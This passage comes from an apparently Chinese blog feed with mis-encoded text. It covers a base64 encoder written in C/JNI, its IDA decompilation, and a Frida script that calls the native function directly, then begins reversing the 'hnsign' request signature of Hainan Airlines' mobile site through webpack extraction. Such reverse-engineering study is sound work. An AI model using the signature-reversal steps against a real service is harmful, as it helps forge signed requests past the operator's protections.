class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,  <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//base64åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;  <span class="comment">//å®šä¹‰outçš„ç´¢å¼•</span></span><br><span class="line">    <span class="type">char</span> last_c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        c = data[i];</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                out[index++] = base64en[(c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3f</span> ];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                out[index++] = base64en[((last_c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | ((c &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span> )];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                out[index++] = base64en[( ( last_c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span> ) | ((c &gt;&gt; <span class="number">6</span> ) &amp; <span class="number">0x3</span>)];</span><br><span class="line">                out[index++] = base64en[c &amp; <span class="number">0x3f</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        last_c = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len % <span class="number">3</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        out[index++] = base64en[(c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len % <span class="number">3</span> == <span class="number">2</span>)&#123;</span><br><span class="line">        out[index++] = base64en[( c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="comment">//å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªå‚æ•°ï¼š</span></span><br><span class="line">    <span class="comment">//â‘ JNI *envè¡¨ç¤ºjavaç¯å¢ƒï¼›</span></span><br><span class="line">    <span class="comment">//â‘¡jobject thizè¿™å—å¯¹åº”å‡½æ•°åï¼Œå¦‚æœæ˜¯staticé™æ€æ–¹æ³•ï¼Œè¿™å—å‚æ•°å°†ä¸ºjclass clazã€‚éstaticæ–¹æ³•åˆ™ä¸ºjobject thiz</span></span><br><span class="line">    <span class="comment">//â‘¢ä¼ å…¥çœŸæ­£çš„å‚æ•°</span></span><br><span class="line"><span class="built_in">Java_com_roysue_base64_MainActivity_base64_1enc</span>(JNIEnv *env, jobject thiz, jstring data) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement base64_enc()</span></span><br><span class="line">    <span class="type">char</span> *c_data = <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(env-&gt;<span class="built_in">GetStringUTFChars</span>(data, <span class="number">0</span>));  <span class="comment">//å°†javaå±‚çš„dataå‚æ•°ä¼ å…¥åˆ°Cä¸­ï¼Œå¹¶è¿›è¡Œç±»å‹å¼ºè½¬</span></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(c_data);  <span class="comment">//å®šä¹‰c_dataçš„é•¿åº¦</span></span><br><span class="line">    <span class="type">char</span> out[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">base64_enc</span>(c_data,len,out);  <span class="comment">//è°ƒç”¨base64_encè¿›è¡Œbase64ç¼–ç </span></span><br><span class="line">    env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(data,c_data);  <span class="comment">//è¿›è¡Œå†…å­˜çš„é‡Šæ”¾ï¼Œå°†å‰é¢å®šä¹‰çš„å˜é‡è¿›è¡Œé‡Šæ”¾</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(out);  <span class="comment">//å¾—åˆ°åŠ å¯†åçš„å€¼</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç ä»‹ç»ï¼š</strong></p><p>ç”±äºbase64ç¼–ç æ˜¯å°†ç¼–ç å‰çš„3*8ä½æ•°æ®ï¼Œåˆ†è§£æˆ4ä¸ª6ä½çš„æ•°æ®ï¼Œæ‰€ä»¥ç»è¿‡base64ç¼–ç åçš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯4çš„å€æ•°ã€‚</p><p>ä½†å¾€å¾€è¿›è¡Œç¼–ç çš„æ•°æ®é•¿åº¦å¹¶ä¸æ˜¯3çš„å€æ•°ï¼Œè¿™å°±é€ æˆäº†â€œç¼–ç â€åçš„ä½æ•°ä¸ä¸º4çš„å€æ•°ï¼Œæ¯”å¦‚ â€œBriskâ€ å…±5Ã—8&#x3D;40ä½ï¼Œä»¥6ä½ä¸ºä¸€ç»„å¯ä»¥åˆ†ä¸º7ç»„ï¼Œè¿™æ ·â€œç¼–ç â€åå°±æœ‰7ä¸ªå­—ç¬¦ï¼Œä½†base64ç¼–ç åçš„å­—ç¬¦é•¿åº¦åº”è¯¥æ˜¯4çš„å€æ•°ï¼Œæ˜¾ç„¶è¿™é‡Œå°±å‡ºé—®é¢˜äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿå‰é¢çš„ä¸å¯ä»¥æŠ›å¼ƒæ‰ï¼Œæ‰€ä»¥å°±åªæœ‰â€œè¿½åŠ â€äº†ï¼Œæ‰€ä»¥Briskç»è¿‡base64ç¼–ç åçš„é•¿åº¦åº”è¯¥æ˜¯8ä¸ªå­—ç¬¦ï¼Œè€Œç¬¬8ä¸ªç¼–ç åçš„å­—ç¬¦æ˜¯â€™&#x3D;â€™ï¼Œå†æ¯”å¦‚å¯¹å•ä¸ªå­—ç¬¦aè¿›è¡Œbase64ç¼–ç ï¼Œç”±äºå®ƒçš„é•¿åº¦ä¸æ˜¯3çš„å€æ•°ï¼Œä»¥3ä¸ªå­—èŠ‚ä¸ºä¸€ç»„å®ƒåªèƒ½åˆ†ä¸€ç»„ï¼Œå†ä»¥6ä½ä¸ºä¸€ä½å®ƒåªèƒ½åˆ†ä¸¤ç»„ï¼Œæ‰€ä»¥ç»è¿‡â€œç¼–ç â€åå®ƒçš„é•¿åº¦æ˜¯2ï¼Œä½†base64ç¼–ç åçš„ä¸ªæ•°åº”è¯¥æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥å®ƒçš„é•¿åº¦åº”è¯¥æ˜¯4ï¼Œæ‰€ä»¥åœ¨åé¢è¡¥ä¸Šä¸¤ä¸ªâ€˜&#x3D;â€™,ç”±äºä¸€ä¸ªæ•°æ±‚ä½™3åæœ‰ä¸‰ä¸ªä¸åŒçš„ç»“æœï¼Œ0ã€1ã€2ï¼Œæ‰€ä»¥åœ¨å¯¹ä¸€ä¸ªæ•°æ®è¿›è¡Œbase64è¿›è¡Œç¼–ç åå®ƒçš„é•¿åº¦ä¸ºï¼š</p><p>ï¼ˆ1ï¼‰å½“è¿›è¡Œç¼–ç çš„æ•°æ®é•¿åº¦æ˜¯3çš„å€æ•°æ—¶ï¼Œlen&#x3D;strlen(str_in)&#x2F;3*4;</p><p>ï¼ˆ2ï¼‰å½“è¿›è¡Œç¼–ç çš„æ•°æ®é•¿åº¦ä¸æ˜¯3çš„å€æ•°æ—¶ï¼Œlen&#x3D;(strlen(str_in)&#x2F;3+1)*4;</p><p>ä¸Šé¢çš„ä»£ç å®ç°åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼šè¾“å…¥æ•°æ®é•¿åº¦æ˜¯3çš„å€æ•°ï¼ŒæŒ‰ç…§base64çš„åŸç†å¯¹æ•°æ®è¿›è¡Œç§»ä½æ“ä½œï¼Œè½¬æ¢æ‰¿å¯¹åº”çš„base64ç¼–ç </p><p>ç¬¬äºŒéƒ¨åˆ†ï¼šå¦‚æœä¸æ˜¯3çš„å€æ•°ï¼Œä¹Ÿå°±æ„å‘³ï¼ˆlen % 3 &#x3D;&#x3D; 1ï¼‰æˆ–è€…ï¼ˆlen % 3 &#x3D;&#x3D; 2ï¼‰ï¼Œåˆ™éœ€è¦åœ¨åé¢è¡¥å……å¯¹åº”çš„ â€œ&#x3D;â€</p><h1 id="base64é€†å‘è¯†åˆ«â€”IDA"><a href="#base64é€†å‘è¯†åˆ«â€”IDA" class="headerlink" title="base64é€†å‘è¯†åˆ«â€”IDA"></a>base64é€†å‘è¯†åˆ«â€”IDA</h1><h2 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h2><p>å°†å‰é¢å†™å¥½çš„ä»£ç æ‰“åŒ…æˆapkåï¼Œè§£å‹ï¼Œæ‹¿åˆ°é‡Œé¢çš„soæ–‡ä»¶ï¼Œåˆ©ç”¨IDAè¿›è¡Œåˆ†æï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745544.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745698.png" alt="image.png"> </p><p>1ã€å°†soæ–‡ä»¶æ‹–å…¥åˆ°IDAä¸­</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745356.png" alt="image.png"> </p><p>2ã€æ‰¾åˆ°æˆ‘ä»¬å®šä¹‰å¥½çš„å¯¼å‡ºå‡½æ•° base64_encã€‚</p><p>å¯ä»¥çœ‹åˆ°ä»javaå±‚åˆ°soå±‚ï¼Œå‡½æ•°çš„å‘½åä¼šå‘ç”Ÿä¸€å®šå˜åŒ–ï¼Œåœ¨soå±‚å«åš â€œJava_com_roysue_base64_MainActivity_base64_1encâ€(Java_åŒ…å_å‡½æ•°å)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745469.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745189.png" alt="image.png"> </p><p>3ã€æ‰¾åˆ°äº†å…·ä½“çš„base64çš„å®ç°æµç¨‹ï¼šbase64_enc(s, v4, (char *)v8);</p><ul><li>sï¼šä¼ å…¥çš„å­—ç¬¦ä¸²data</li><li>v4ï¼šå­—ç¬¦ä¸²é•¿åº¦</li><li>(char*)v8ï¼šä¿å­˜è¾“å‡ºå†…å®¹çš„å˜é‡</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745751.png" alt="img"> </p><p>ç”¨äº†â€œ<em>Z10base64_encPciS</em>(a1, a2, a3);â€å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746949.png" alt="image.png"> </p><h2 id="2-base64-enc"><a href="#2-base64-enc" class="headerlink" title="2. base64_enc"></a>2. base64_enc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+4h] [bp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [sp+Ah] [bp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v10; <span class="comment">// [sp+Bh] [bp-11h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = data[i];</span><br><span class="line">    v7 = i % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v11++;</span><br><span class="line">        out[v4] = byte_16FC4[(<span class="number">16</span> * (v10 &amp; <span class="number">3</span>)) | (v9 &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        out[v11] = byte_16FC4[(<span class="number">4</span> * (v10 &amp; <span class="number">0xF</span>)) | (v9 &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">        v5 = v11 + <span class="number">1</span>;</span><br><span class="line">        v11 += <span class="number">2</span>;</span><br><span class="line">        out[v5] = byte_16FC4[v9 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      out[v3] = byte_16FC4[v9 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    out[v11] = byte_16FC4[<span class="number">16</span> * (v9 &amp; <span class="number">3</span>)];</span><br><span class="line">    out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    result = out;</span><br><span class="line">    out[v11 + <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)(len % <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      out[v11] = byte_16FC4[<span class="number">4</span> * (v9 &amp; <span class="number">0xF</span>)];</span><br><span class="line">      result = out;</span><br><span class="line">      out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ã€æŸ¥çœ‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°byte_16FC4å‚æ•°ï¼Œå¯¹åº”å†…å®¹æ˜¯ä¸€ä¸ªæ ‡å‡†çš„base64ç¼–ç è¡¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746200.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161747749.png" alt="image.png"></p><p>åˆ°è¿™å—å°±å¯ä»¥å¤§èƒ†çŒœæµ‹ä¸€ä¸‹ï¼Œå½“å‰ç®—æ³•ä¸ºbase64äº†ï¼Œå› ä¸ºbase64çš„å‚æ•°å› å­æ˜¯è¯¥ç¼–ç çš„ä¸€ä¸ªç‰¹å¾ã€‚</p><p>å“ªæ€•æœ‰çš„base64ç¼–ç åšäº†é­”æ”¹ï¼Œå…¶å®æœ¬è´¨ä¹Ÿå¤§éƒ½æ˜¯ä¿®æ”¹<strong>å‚æ•°å› å­</strong>çš„å†…å®¹ï¼</p><p>2ã€å¯¹æ¯”ä¸Šé¢å†™çš„Cä»£ç ï¼Œæ˜¯å°†switchè½¬æ¢æˆäº†ä¸€ä¸ªå¤šå±‚çš„ifåˆ¤æ–­</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161748467.png" alt="image.png"> </p><p>å‰©ä¸‹çš„å°±ä¸å…·ä½“åˆ†æäº†ï¼Œç•¥ç•¥ç•¥~</p><h1 id="frida-soå…¥é—¨"><a href="#frida-soå…¥é—¨" class="headerlink" title="frida soå…¥é—¨"></a>frida soå…¥é—¨</h1><p>ä¸Šé¢çš„soä»£ç æ˜¯æ²¡æœ‰åšç¬¦å·æŠ½å–çš„ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å‡½æ•°åå­—ã€‚è¦æ˜¯åšäº†ç¬¦å·æŠ½å–ï¼Œå‡½æ•°åæ˜¯ä¸å¯è¢«ç›´æ¥è¯†åˆ«çš„ã€‚</p><p>æ‰€ä»¥ï¼Œå½“åˆ¤æ–­ä¸€ä¸ªsoå±‚çš„å‡½æ•°å¯èƒ½å®ç°äº†ç‰¹å®šåŠŸèƒ½çš„æ—¶å€™ï¼Œå¯ä»¥è°ƒç”¨fridaæ¥å®ç°ä¸»åŠ¨è°ƒç”¨</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">base64_enc</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> func_addr = base.<span class="title function_">add</span>(<span class="number">0x8E85</span>) ; <span class="comment">//0x8E84æ˜¯å‡½æ•°çš„åç§»åœ°å€ï¼Œ+1æ˜¯ä¸ºäº†è·³è¿‡ThumbæŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(func_addr,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])  <span class="comment">//å£°æ˜å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°è¿”å›å€¼ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å‡½æ•°å‚æ•°ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//åˆ†é…å†…å­˜ï¼Œç”¨äºå­˜æ”¾è¾“å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="title function_">ptr</span>(arg1).<span class="title function_">writeUtf8String</span>(data) <span class="comment">//å‘å†…å­˜ä¸­å†™å…¥è¾“å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> arg3 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//åˆ†é…å†…å­˜ï¼Œç”¨äºå­˜æ”¾è¾“å‡ºçš„base64å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="title function_">func</span>(arg1,data.<span class="property">length</span>,arg3) <span class="comment">//è°ƒç”¨å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¾“å‡ºçš„base64å­—ç¬¦ä¸²åœ°å€</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(arg3).<span class="title function_">readCString</span>() <span class="comment">//è¯»å–è¾“å‡ºçš„base64å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">//è¿”å›base64å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ã€æŸ¥æ‰¾å‡½æ•°åŸºå€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var base = Module.findBaseAddress(&#x27;libnative-lib.so&#x27;);</span><br><span class="line">var func_addr = base + 0x8E84 + 1; //0x8E84æ˜¯å‡½æ•°çš„åç§»åœ°å€ï¼Œ+1æ˜¯ä¸ºäº†è·³è¿‡ThumbæŒ‡ä»¤</span><br></pre></td></tr></table></figure><p>é€šè¿‡Module.findBaseAddressè·å–soæ–‡ä»¶çš„åŸºå€ï¼Œå†æŸ¥æ‰¾åˆ°å‡½æ•°çš„åç§»åœ°å€ã€‚</p><p>ç„¶åè¿˜éœ€è¦åˆ¤æ–­å½“å‰æŒ‡ä»¤é›†æ˜¯thumbçš„è¿˜æ˜¯armçš„ã€‚åˆ¤æ–­æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>ï¼ˆ1ï¼‰Option-&gt;Gereral-&gt;è®¾ç½®å­—èŠ‚å¤§å°ä¸º4</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750656.png" alt="image.png"> </p><p>ï¼ˆ2ï¼‰æŸ¥çœ‹å‡½æ•°ä¸­çš„åœ°å€ï¼Œå¦‚æœå…¨éƒ¨ä¸º4å­—èŠ‚çš„è¯ï¼Œä¸ºarmæŒ‡ä»¤é›†ï¼›å¦‚æœå«æœ‰2ä¸ªå­—èŠ‚ï¼Œåˆ™ä¸ºthumbæŒ‡ä»¤é›†ï¼ŒthumbæŒ‡ä»¤é›†åœ¨æŸ¥æ‰¾å‡½æ•°åŸºå€æ—¶è¦+1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750054.png" alt="image.png"> </p><p>2ã€æœ€ç»ˆæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750989.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ·å—èˆªç©ºhnsigné€†å‘</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€ã€é€†å‘ç›®æ ‡"><a href="#ä¸€ã€é€†å‘ç›®æ ‡" class="headerlink" title="ä¸€ã€é€†å‘ç›®æ ‡"></a>ä¸€ã€é€†å‘ç›®æ ‡</h1><ul><li>ç›®æ ‡ï¼šæµ·å—èˆªç©ºhnsigné€†å‘</li><li>é“¾æ¥ï¼š<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>ç®€ä»‹ï¼šç­¾åç®—æ³•ï¼šé€šå¸¸ç­¾åæœ‰ä¸€ä¸ªå¯¹è±¡ç»„åˆçš„æ“ä½œï¼Œå­—ç¬¦ä¸²æ‹¼æ¥çš„æ“ä½œï¼Œç„¶åå†å¯¹è¿™ä¸ªå¯¹è±¡å±æ€§æˆ–å­—ç¬¦ä¸²è¿›è¡Œä¸€ä¸ªæ’åºï¼Œç»„åˆçš„ä»£ç ï¼Œçœ‹ä¸æ‡‚ï¼Œæœ€æ–¹ä¾¿çš„æ–¹å¼è°ƒè¯•ï¼Œæ‹¿åˆ°å®ƒç»„åˆåçš„ç»“æœã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648957.png" alt="image.png"> </p><h1 id="äºŒã€é€†å‘å‚æ•°"><a href="#äºŒã€é€†å‘å‚æ•°" class="headerlink" title="äºŒã€é€†å‘å‚æ•°"></a>äºŒã€é€†å‘å‚æ•°</h1><p>è·Ÿè¿›è¿™ä¸ªåŠ å¯†å‡½æ•°ä¸­ï¼Œå¯ä»¥å‘ç°ä¾æ—§æ˜¯webpackï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648859.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a.default._makeSign(null, c, p, null, n)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°å®šä¹‰å¯¹è±¡ â€œaâ€ çš„åœ°æ–¹ï¼Œå‘ä¸Šç¿»ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = E(n(38195))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648160.png" alt="image.png"> </p><h2 id="1ã€æ‰£å–å¯åŠ¨å™¨"><a href="#1ã€æ‰£å–å¯åŠ¨å™¨" class="headerlink" title="1ã€æ‰£å–å¯åŠ¨å™¨"></a>1ã€æ‰£å–å¯åŠ¨å™¨</h2><p>æ­£å¸¸æ–¹æ³•ï¼Œåœ¨å‡½æ•° n å¤„ï¼Œä¸‹æ–­ç‚¹ï¼Œå®šä½åˆ°å¯åŠ¨å™¨ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101650788.png" alt="image.png"> </p><p>æ”¹å†™åï¼Œå¯åŠ¨å™¨å¦‚ä¸‹ï¼šï¼ˆå’Œå‰é¢passwordçš„ä¸€æ ·ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//æ¨¡å—</span></span><br><span class="line">  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2ã€æ‰£å–åŠ å¯†æ¨¡å—"><a href="#2ã€æ‰£å–åŠ å¯†æ¨¡å—" class="headerlink" title="2ã€æ‰£å–åŠ å¯†æ¨¡å—"></a>2ã€æ‰£å–åŠ å¯†æ¨¡å—</h2><p>è¿™å—ç¬¬ä¸€ä¸ªæ‰£å–çš„æ¨¡å—ä¸º 